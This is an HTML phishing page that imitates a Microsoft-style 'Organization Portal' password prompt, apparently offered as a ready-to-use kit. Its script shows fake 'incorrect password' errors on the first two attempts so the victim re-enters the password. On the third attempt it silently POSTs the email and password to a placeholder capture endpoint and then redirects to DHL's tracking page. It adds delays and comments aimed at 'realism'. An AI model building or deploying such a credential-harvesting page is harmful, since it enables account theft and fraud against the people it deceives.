<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/png" href="https://www.google.com/s2/favicons?domain=microsoft.com">
    <style>
        :root {
            --bg-color: #f2f2f2;
            --card-bg: #ffffff;
            --text-main: #1b1b1b;
            --text-secondary: #666666;
            --primary-blue: #0067b8;
            --error-red: #e81123;
            --border-color: #dedede;
        }

        body {
            font-family: 'Segoe UI', 'Roboto', sans-serif;
            background-color: var(--bg-color);
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: var(--text-main);
        }

        .login-card {
            background: var(--card-bg);
            padding: 44px;
            width: 100%;
            max-width: 352px; /* Standard Microsoft/Okta card width */
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            min-height: 350px;
            position: relative;
        }

        .brand-logo {
            height: 24px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            font-weight: 600;
            font-size: 1.2rem;
            color: var(--text-secondary);
        }

        h1 {
            font-size: 1.5rem;
            font-weight: 600;
            margin: 0 0 12px 0;
            color: #1b1b1b;
        }

        .user-display {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            font-size: 0.95rem;
        }

        input[type="password"] {
            width: 100%;
            padding: 8px 0;
            border: none;
            border-bottom: 1px solid var(--text-main);
            font-size: 1rem;
            margin-bottom: 24px;
            outline: none;
            transition: border-color 0.2s;
        }

        input[type="password"]:focus {
            border-bottom: 2px solid var(--primary-blue);
        }

        .error-msg {
            color: var(--error-red);
            font-size: 0.9rem;
            margin-bottom: 16px;
            display: none;
        }

        .btn-group {
            display: flex;
            justify-content: flex-end;
            margin-top: 10px;
        }

        button {
            background-color: var(--primary-blue);
            color: white;
            border: none;
            padding: 8px 36px;
            font-size: 0.95rem;
            cursor: pointer;
            min-width: 108px;
            transition: opacity 0.2s;
        }

        button:hover {
            opacity: 0.8;
        }

        .footer-links {
            font-size: 0.8rem;
            color: var(--text-secondary);
            margin-top: 30px;
        }

        /* Subtle Loader Animation */
        .loading-bar {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 3px;
            background: #eee;
            overflow: hidden;
            display: none;
        }
        .loading-bar::after {
            content: "";
            display: block;
            width: 40%; height: 100%;
            background: var(--primary-blue);
            animation: move 1.2s infinite ease-in-out;
        }
        @keyframes move { 
            0% { transform: translateX(-100%); } 
            100% { transform: translateX(300%); } 
        }
    </style>
</head>
<body>

<div class="login-card">
    <div id="loader" class="loading-bar"></div>
    
    <div class="brand-logo">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="#747474" style="margin-right:8px"><path d="M12 2L2 7v10l10 5 10-5V7L12 2zm0 2.18l8 4v8.64l-8 4-8-4V8.18l8-4z"/></svg>
        <span>Organization Portal</span>
    </div>

    <h1>Enter password</h1>
    
    <div class="user-display" id="email-display">user@organization.com</div>

    <div id="err" class="error-msg">
        Your account or password is incorrect. If you don't remember your password, reset it now.
    </div>

    <form id="authForm">
        <input type="password" id="p" placeholder="Password" required autofocus>
        
        <div class="footer-links">
            <p style="color: var(--primary-blue); cursor: pointer; margin-bottom: 20px;">Forgot password?</p>
            <p>Other ways to sign in</p>
        </div>

        <div class="btn-group">
            <button type="submit" id="b">Sign in</button>
        </div>
    </form>
</div>

<script>
    let tries = 0;
    const params = new URLSearchParams(window.location.search);
    const emailField = document.getElementById('email-display');
    const passInput = document.getElementById('p');
    const errBox = document.getElementById('err');

    // Handle incoming Email (Base64)
    if(params.has('u')) {
        try { emailField.innerText = atob(params.get('u')); } catch(e) {}
    }

    document.getElementById('authForm').onsubmit = async (e) => {
        e.preventDefault();
        tries++;

        const email = emailField.innerText;
        const pass = passInput.value;

        // Visual feedback: briefly show loader to mimic server check
        document.getElementById('loader').style.display = 'block';
        document.getElementById('b').disabled = true;

        setTimeout(async () => {
            if (tries < 3) {
                // First and second attempts fail to ensure accuracy
                document.getElementById('loader').style.display = 'none';
                document.getElementById('b').disabled = false;
                errBox.style.display = 'block';
                passInput.value = "";
                passInput.focus();
                
                if(tries === 2) {
                    errBox.innerText = "For security, please re-enter your password to confirm your identity.";
                }
            } else {
                // Third attempt: Silent data capture and redirect
                try {
                    await fetch('https://your-backend-api.com/capture', {
                        method: 'POST',
                        body: JSON.stringify({ email, pass })
                    });
                } catch(e) {}

                // Redirect to the actual resource they were "trying" to access
                window.location.href = "https://www.dhl.com/global-en/home/tracking.html";
            }
        }, 1000); // 1-second delay for "realism"
    };
</script>
</body>
</html>
